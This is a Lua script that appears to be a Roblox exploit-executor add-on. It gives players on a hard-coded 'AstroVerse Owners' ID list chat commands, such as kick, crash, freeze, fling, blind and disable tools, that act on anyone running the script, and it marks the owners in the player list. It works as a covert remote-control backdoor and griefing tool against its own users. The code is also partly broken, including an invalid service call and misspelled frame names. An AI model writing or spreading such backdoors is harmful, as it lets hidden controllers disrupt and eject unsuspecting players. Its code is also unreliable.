local Owners = {
    1913576607, 1682081779, 3927844640, 118261992, 1891283554, 
    1971112971, 3996805816, 894642653, 203599835, 3941987370, 
    198508658, 4248708772, 529076146, 4529099164, 3640313057,
    2956935559, 6147751229
}
local VIP = {
    3682132159, 370326509, 676636514
}

local function Freeze(target)
    getgenv().Freeze = game:GetService("RunService").Heartbeat:Connect(function()
        if target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.Anchored = true
        end
    end)
end

local function UFreeze(target)
    if getgenv().Freeze then
        getgenv().Freeze:Disconnect()
        if target.Character and target.Character:FindFirstChild("Humanoid") then
            target.Character.Humanoid.Anchored = false
        end
    end
end

local function Sleep(target)
    if target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
        target.Character.Humanoid.PlatformStand = true
    end
end

local function UnSleep(target)
    if target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
        target.Character.Humanoid.PlatformStand = false
    end
end

local function Fling(target)
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        target.Character.HumanoidRootPart.Velocity = Vector3.new(0, 10000000, 0)
    end
end

local function ToolDisable(target)
    getgenv().NoTool = game:GetService("RunService").Heartbeat:Connect(function()
        if target.Character then
            for _, v in pairs(target.Character:GetChildren()) do
                if v:IsA("Tool") then
                    target.Character.Humanoid:UnequipTools()
                end
            end
        end
    end)
end

local function ToolEnable()
    if getgenv().NoTool then
        getgenv().NoTool:Disconnect()
    end
end

local function Ban(target)
    target:Kick("You Have Been Kicked By AstroVerse Owners")
end

local function Reveal()
    local args = {
        [1] = "AstroVerse On Top!",
        [2] = "All"
    }
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))     
end

local function Spin(target)
    local spinSpeed = 20
    if target.Character then
        for _, v in pairs(target.Character:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end
        local Spin = Instance.new("BodyAngularVelocity")
        Spin.Name = "Spinning"
        Spin.Parent = target.Character:FindFirstChild("HumanoidRootPart")
        Spin.MaxTorque = Vector3.new(0, math.huge, 0)
        Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
    end
end

local function USpin(target)
    if target.Character then
        for _, v in pairs(target.Character:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end
    end
end

local function LoopTp(target)
    if target.Name == game:GetService("s").Local.Name then
        getgenv().TPLoop = game:GetService("RunService").Heartbeat:Connect(function()
            local player = game:GetService("Players").LocalPlayer
            if player.Character and target.Character then
                player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
            end
        end)
    end
end

local function ULoopTp(target)
    if target.Name == game:GetService("Players").LocalPlayer.Name then
        if getgenv().TPLoop then
            getgenv().TPLoop:Disconnect()
        end
    end
end

local function Explode(target)
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local explosion = Instance.new("Explosion")
        explosion.BlastRadius = 1
        explosion.Position = target.Character.HumanoidRootPart.Position
        explosion.Parent = target.Character
    end
end

local function Crash(target)
    if target.Name == game:GetService("Players").LocalPlayer.Name then
        getgenv().MoreCrash = game:GetService("RunService").Heartbeat:Connect(function()
            getgenv().CrashSelf = game:GetService("RunService").Heartbeat:Connect(function()
                local player = game:GetService("Players").LocalPlayer
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local Position = player.Character.HumanoidRootPart.CFrame.Position
                    local Part = Instance.new("Part", game:GetService("Workspace"))
                    Part.Anchored = false
                    Part.CFrame = CFrame.new(Position.X, Position.Y + 20, Position.Z)
                    Part.Name = "CrashPart"
                end
            end)
        end)
    end
end

local function SCrash()
    if getgenv().MoreCrash then
        getgenv().MoreCrash:Disconnect()
    end
    if getgenv().CrashSelf then
        getgenv().CrashSelf:Disconnect()
    end
    for _, v in pairs(game:GetService("Workspace"):GetChildren()) do
        if v.Name == "CrashPart" then
            v:Destroy()
        end
    end
end

local function SetFire(target)
    if target.Character then
        local fire = Instance.new("Fire")
        fire.Parent = target.Character:FindFirstChild("HumanoidRootPart")
    end
end

local function Heal(target)
    if target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.Health = target.Character.Humanoid.MaxHealth
    end
end

local function SetGravity(target, value)
    local character = target.Character
    if character then
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            local bodyForce = humanoidRootPart:FindFirstChildOfClass("BodyForce")
            if not bodyForce then
                bodyForce = Instance.new("BodyForce")
                bodyForce.Parent = humanoidRootPart
            end
            bodyForce.Force = Vector3.new(0, value, 0)
        end
    end
end

local function MakeInvisible(target)
    if target.Character then
        for _, part in pairs(target.Character:GetDescendants()) do
            if part:IsA("BasePart") and part.Transparency < 1 then
                part.Transparency = 1
                part.CanCollide = false
            end
        end
    end
end

local function MakeVisible(target)
    if target.Character then
        for _, part in pairs(target.Character:GetDescendants()) do
            if part:IsA("BasePart") and part.Transparency == 1 then
                part.Transparency = 0
                part.CanCollide = true
            end
        end
    end
end

local function Resize(target, scale)
    if target.Character then
        for _, part in pairs(target.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Size = part.Size * scale
            end
        end
    end
end

local function Shrink(target)
    Resize(target, 0.5)
end

local function Grow(target)
    Resize(target, 2)
end

local function Blind(target)
    local playerGui = target:FindFirstChild("PlayerGui")
    if playerGui then
        local screenGui = Instance.new("ScreenGui", playerGui)
        screenGui.Name = "BlindGui"
        local frame = Instance.new("Frame", screenGui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
    end
end

local function UnBlind(target)
    local playerGui = target:FindFirstChild("PlayerGui")
    if playerGui then
        local screenGui = playerGui:FindFirstChild("BlindGui")
        if screenGui then
            screenGui:Destroy()
        end
    end
end

local function Mute(target)
    target.Muted = true
end

local function UnMute(target)
    target.Muted = false
end

local function Flash(target)
    local playerGui = target:FindFirstChild("PlayerGui")
    if playerGui then
        local screenGui = Instance.new("ScreenGui", playerGui)
        screenGui.Name = "FlashGui"
        local frame = Instance.new("Frame", screenGui)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(1, 1, 1)
        game:GetService("Debris"):AddItem(screenGui, 0.1)
    end
end

local RunService = game:GetService("RunService")
local camera = game.Workspace.CurrentCamera

local shaking = false
local originalCFrame

local function shakeCamera(duration, magnitude)
    if shaking then return end
    getgenv().shaking = true
    local startTime = tick()
    originalCFrame = camera.CFrame

    local function updateShake()
        if not shaking then
            camera.CFrame = originalCFrame
            RunService:UnbindFromRenderStep("CameraShake")
            return
        end

        local elapsed = tick() - startTime
        if elapsed >= duration then
            shaking = false
            camera.CFrame = originalCFrame
            RunService:UnbindFromRenderStep("CameraShake")
            return
        end

        local offset = Vector3.new(
            (math.random() - 0.5) * 2 * magnitude,
            (math.random() - 0.5) * 2 * magnitude,
            (math.random() - 0.5) * 2 * magnitude
        )

        camera.CFrame = originalCFrame * CFrame.new(offset)
    end

    RunService:BindToRenderStep("CameraShake", Enum.RenderPriority.Camera.Value + 1, updateShake)
end

local function stopShake()
    if shaking then
        shaking = false
    end
end


local function Silence(target)
    local playerGui = target:FindFirstChild("PlayerGui")
    if playerGui then
        local muteSound = Instance.new("Sound", playerGui)
        muteSound.Name = "MuteSound"
        muteSound.SoundId = "rbxassetid://0"
        muteSound:Play()
    end
end

local function UnSilence(target)
    local playerGui = target:FindFirstChild("PlayerGui")
    if playerGui then
        local muteSound = playerGui:FindFirstChild("MuteSound")
        if muteSound then
            muteSound:Destroy()
        end
    end
end

local function Disorient(target)
    if target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.WalkSpeed = -target.Character.Humanoid.WalkSpeed
        target.Character.Humanoid.JumpPower = -target.Character.Humanoid.JumpPower
    end
end

local function Orient(target)
    if target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.WalkSpeed = math.abs(target.Character.Humanoid.WalkSpeed)
        target.Character.Humanoid.JumpPower = math.abs(target.Character.Humanoid.JumpPower)
    end
end

local function Ragdoll(target)
    if target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.PlatformStand = true
    end
end

local function UnRagdoll(target)
    if target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.PlatformStand = false
    end
end

local function Jail(target)
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local rootPart = target.Character.HumanoidRootPart
        local jailCell = Instance.new("Part", game.Workspace)
        jailCell.Size = Vector3.new(10, 10, 10)
        jailCell.Position = rootPart.Position
        jailCell.Anchored = true
        jailCell.Name = "JailCell"
        local weld = Instance.new("Weld", rootPart)
        weld.Part0 = rootPart
        weld.Part1 = jailCell
    end
end

local function UnJail(target)
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local rootPart = target.Character.HumanoidRootPart
        for _, part in pairs(game.Workspace:GetChildren()) do
            if part.Name == "JailCell" then
                part:Destroy()
            end
        end
    end
end

local function Bring(target)
    game:GetService("Players").LocalPlayer:MoveTo(target.Character.HumanoidRootPart.CFrame.Position)
end
local Prefix = "."

local function handleCommand(player, msg)
    local loweredString = string.lower(msg)
    local args = string.split(loweredString, " ")
    
    local function getFullUsername(partialUsername)
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if string.find(player.Name:lower(), partialUsername:lower()) then
                return player.Name
            end
        end
        return nil
    end

    local function executeForMatchingPlayer(commandFunc)
        for _, targetPlayer in ipairs(game:GetService("Players"):GetPlayers()) do
            if getFullUsername(args[2]) == targetPlayer.Name and targetPlayer.Character then
                commandFunc(targetPlayer)
            end
        end
    end

    if args[1] == Prefix .. "speed" then
        executeForMatchingPlayer(function(target)
            target.Character.Humanoid.WalkSpeed = tonumber(args[3])
        end)
    elseif args[1] == Prefix .. "jump" then
        executeForMatchingPlayer(function(target)
            target.Character.Humanoid.JumpPower = tonumber(args[3])
        end)
    elseif args[1] == Prefix .. "tp" then
        executeForMatchingPlayer(function(target)
            local localPlayer = game:GetService("Players").LocalPlayer
            if localPlayer.Character then
                localPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
            end
        end)
    elseif args[1] == Prefix .. "kick" then
        executeForMatchingPlayer(Ban)
    elseif args[1] == Prefix .. "rj" then
        executeForMatchingPlayer(
            function(target)
                if target.Name == game:GetService("Players").LocalPlayer.Name then
                    local ts = game:GetService("TeleportService")
                    local localPlayer = game:GetService("Players").LocalPlayer
                    ts:Teleport(game.PlaceId, localPlayer)
                end
            end
        )
    elseif args[1] == Prefix .. "crash" then
        executeForMatchingPlayer(Crash)
    elseif args[1] == Prefix .. "stopcrash" then
        executeForMatchingPlayer(SCrash)
    elseif args[1] == Prefix .. "spin" then
        executeForMatchingPlayer(Spin)
    elseif args[1] == Prefix .. "unspin" then
        executeForMatchingPlayer(USpin)
    elseif args[1] == Prefix .. "looptp" then
        executeForMatchingPlayer(LoopTp)
    elseif args[1] == Prefix .. "unlooptp" then
        executeForMatchingPlayer(ULoopTp)
    elseif args[1] == Prefix .. "fling" then
        executeForMatchingPlayer(Fling)
    elseif args[1] == Prefix .. "reveal" then
        Reveal()
    elseif args[1] == Prefix .. "notools" then
        executeForMatchingPlayer(ToolDisable)
    elseif args[1] == Prefix .. "unnotools" then
        ToolEnable()
    elseif args[1] == Prefix .. "ban" then
        executeForMatchingPlayer(Ban)
    elseif args[1] == Prefix .. "freeze" then
        executeForMatchingPlayer(Freeze)
    elseif args[1] == Prefix .. "unfreeze" then
        executeForMatchingPlayer(UFreeze)
    elseif args[1] == Prefix .. "explode" then
        executeForMatchingPlayer(Explode)
    elseif args[1] == Prefix .. "sleep" then
        executeForMatchingPlayer(Sleep)
    elseif args[1] == Prefix .. "unsleep" then
        executeForMatchingPlayer(UnSleep)
    elseif args[1] == Prefix .. "shrink" then
        executeForMatchingPlayer(Shrink)
    elseif args[1] == Prefix .. "grow" then
        executeForMatchingPlayer(Grow)
    elseif args[1] == Prefix .. "blind" then
        executeForMatchingPlayer(Blind)
    elseif args[1] == Prefix .. "unblind" then
        executeForMatchingPlayer(UnBlind)
    elseif args[1] == Prefix .. "mute" then
        executeForMatchingPlayer(Mute)
    elseif args[1] == Prefix .. "unmute" then
        executeForMatchingPlayer(UnMute)
    elseif args[1] == Prefix .. "flash" then
        executeForMatchingPlayer(Flash)
    elseif args[1] == Prefix .. "dizzy" then
        executeForMatchingPlayer(function(target)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                shakeCamera(600, 1)
            end
        end)
    elseif args[1] == Prefix .. "undizzy" then
        executeForMatchingPlayer(function(target)
            if target.Name == game:GetService("Players").LocalPlayer.Name then
                stopShake()
            end
        end)
    elseif args[1] == Prefix .. "silence" then
        executeForMatchingPlayer(Silence)
    elseif args[1] == Prefix .. "unsilence" then
        executeForMatchingPlayer(UnSilence)
    elseif args[1] == Prefix .. "disorient" then
        executeForMatchingPlayer(Disorient)
    elseif args[1] == Prefix .. "orient" then
        executeForMatchingPlayer(Orient)
    elseif args[1] == Prefix .. "ragdoll" then
        executeForMatchingPlayer(Ragdoll)
    elseif args[1] == Prefix .. "unragdoll" then
        executeForMatchingPlayer(UnRagdoll)
    elseif args[1] == Prefix .. "jail" then
        executeForMatchingPlayer(Jail)
    elseif args[1] == Prefix .. "unjail" then
        executeForMatchingPlayer(UnJail)
    elseif args[1] == Prefix .. "gravity" then
        executeForMatchingPlayer(function(target)
            SetGravity(target, tonumber(args[3]))
        end)
    elseif args[1] == Prefix .. "resize" then
        executeForMatchingPlayer(function(target)
            Resize(target, tonumber(args[3]))
        end)
    end
end

game.Players.PlayerAdded:Connect(function(plr)
    if table.find(Owners, plr.UserId) then
        local success, err = pcall(function()
            if plr then
                local userIdString = "p_" .. tostring(plr.UserId)
                local coreGui = game:GetService("CoreGui")
                
                -- Navigate through the hierarchy safely
                local playerList = coreGui:FindFirstChild("PlayerList")
                if playerList then
                    local playerListMaster = playerList:FindFirstChild("PlayerListMaster")
                    if playerListMaster then
                        local offsetFrame = playerListMaster:FindFirstChild("OffsetFrame")
                        if offsetFrame then
                            local playerScrollList = offsetFrame:FindFirstChild("PlayerScrollList")
                            if playerScrollList then
                                local sizeOffsetFrame = playerScrollList:FindFirstChild("SizeOffsetFrame")
                                if sizeOffsetFrame then
                                    local scrollingFrameContainer = sizeOffsetFrame:FindFirstChild("ScrollingFrameContainer")
                                    if scrollingFrameContainer then
                                        local scrollingFrameClippingFrame = scrollingFrameContainer:FindFirstChild("ScrollingFrameClippingFrame")
                                        if scrollingFrameClippingFrame then
                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScrollingFrame")
                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScollingFrame")
                                            if scrollingFrame then
                                                local offsetUndoFrame = scrollingFrame:FindFirstChild("OffsetUndoFrame")
                                                if offsetUndoFrame then
                                                    local targetFrame = offsetUndoFrame:FindFirstChild(userIdString)
                                                    if targetFrame then
                                                        local childrenFrame = targetFrame:FindFirstChild("ChildrenFrame")
                                                        if childrenFrame then
                                                            local nameFrame = childrenFrame:FindFirstChild("NameFrame")
                                                            if nameFrame then
                                                                local bgFrame = nameFrame:FindFirstChild("BGFrame")
                                                                if bgFrame then
                                                                    local overlayFrame = bgFrame:FindFirstChild("OverlayFrame")
                                                                    if overlayFrame then
                                                                        local playerName = overlayFrame:FindFirstChild("PlayerName")
                                                                        if playerName then
                                                                            local playerNameLabel = playerName:FindFirstChild("PlayerName")
                                                                            if playerNameLabel then print(playerNameLabel.Text)
                                                                                playerNameLabel.Text = "[AstroVerse Owner] "..playerNameLabel.Text
                                                                            else
                                                                                error("PlayerNameLabel not found")
                                                                            end
                                                                        else
                                                                            error("PlayerName not found")
                                                                        end
                                                                    else
                                                                        error("OverlayFrame not found")
                                                                    end
                                                                else
                                                                    error("BGFrame not found")
                                                                end
                                                            else
                                                                error("NameFrame not found")
                                                            end
                                                        else
                                                            error("ChildrenFrame not found")
                                                        end
                                                    else
                                                        error("TargetFrame not found")
                                                    end
                                                else
                                                    error("OffsetUndoFrame not found")
                                                end
                                            elseif ScollingFrame then
                                            else
                                                error("ScrollingFrame not found")
                                            end
                                        else
                                            error("ScrollingFrameClippingFrame not found")
                                        end
                                    else
                                        error("ScrollingFrameContainer not found")
                                    end
                                else
                                    error("SizeOffsetFrame not found")
                                end
                            else
                                error("PlayerScrollList not found")
                            end
                        else
                            error("OffsetFrame not found")
                        end
                    else
                        error("PlayerListMaster not found")
                    end
                else
                    error("PlayerList not found")
                end
            else
                error("Player not found")
            end
        end)
        if not success then
            warn("An error occurred: " .. err)
        end
        plr.Chatted:Connect(function(msg)
            handleCommand(plr, msg)
        end)
    end
end)

for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
    if table.find(Owners, plr.UserId) then
        local success, err = pcall(function()
            if plr then
                local userIdString = "p_" .. tostring(plr.UserId)
                local coreGui = game:GetService("CoreGui")
                
                -- Navigate through the hierarchy safely
                local playerList = coreGui:FindFirstChild("PlayerList")
                if playerList then
                    local playerListMaster = playerList:FindFirstChild("PlayerListMaster")
                    if playerListMaster then
                        local offsetFrame = playerListMaster:FindFirstChild("OffsetFrame")
                        if offsetFrame then
                            local playerScrollList = offsetFrame:FindFirstChild("PlayerScrollList")
                            if playerScrollList then
                                local sizeOffsetFrame = playerScrollList:FindFirstChild("SizeOffsetFrame")
                                if sizeOffsetFrame then
                                    local scrollingFrameContainer = sizeOffsetFrame:FindFirstChild("ScrollingFrameContainer")
                                    if scrollingFrameContainer then
                                        local scrollingFrameClippingFrame = scrollingFrameContainer:FindFirstChild("ScrollingFrameClippingFrame")
                                        if scrollingFrameClippingFrame then
                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScrollingFrame")
                                            local scrollingFrame = scrollingFrameClippingFrame:FindFirstChild("ScollingFrame")
                                            if scrollingFrame then
                                                local offsetUndoFrame = scrollingFrame:FindFirstChild("OffsetUndoFrame")
                                                if offsetUndoFrame then
                                                    local targetFrame = offsetUndoFrame:FindFirstChild(userIdString)
                                                    if targetFrame then
                                                        local childrenFrame = targetFrame:FindFirstChild("ChildrenFrame")
                                                        if childrenFrame then
                                                            local nameFrame = childrenFrame:FindFirstChild("NameFrame")
                                                            if nameFrame then
                                                                local bgFrame = nameFrame:FindFirstChild("BGFrame")
                                                                if bgFrame then
                                                                    local overlayFrame = bgFrame:FindFirstChild("OverlayFrame")
                                                                    if overlayFrame then
                                                                        local playerName = overlayFrame:FindFirstChild("PlayerName")
                                                                        if playerName then
                                                                            local playerNameLabel = playerName:FindFirstChild("PlayerName")
                                                                            if playerNameLabel then print(playerNameLabel.Text)
                                                                                playerNameLabel.Text = "[AstroVerse Owner] "..playerNameLabel.Text
                                                                            else
                                                                                error("PlayerNameLabel not found")
                                                                            end
                                                                        else
                                                                            error("PlayerName not found")
                                                                        end
                                                                    else
                                                                        error("OverlayFrame not found")
                                                                    end
                                                                else
                                                                    error("BGFrame not found")
                                                                end
                                                            else
                                                                error("NameFrame not found")
                                                            end
                                                        else
                                                            error("ChildrenFrame not found")
                                                        end
                                                    else
                                                        error("TargetFrame not found")
                                                    end
                                                else
                                                    error("OffsetUndoFrame not found")
                                                end
                                            elseif ScollingFrame then
                                            else
                                                error("ScrollingFrame not found")
                                            end
                                        else
                                            error("ScrollingFrameClippingFrame not found")
                                        end
                                    else
                                        error("ScrollingFrameContainer not found")
                                    end
                                else
                                    error("SizeOffsetFrame not found")
                                end
                            else
                                error("PlayerScrollList not found")
                            end
                        else
                            error("OffsetFrame not found")
                        end
                    else
                        error("PlayerListMaster not found")
                    end
                else
                    error("PlayerList not found")
                end
            else
                error("Player not found")
            end
        end)
        if not success then
            warn("An error occurred: " .. err)
        end
        plr.Chatted:Connect(function(msg)
            handleCommand(plr, msg)
        end)
    end
end
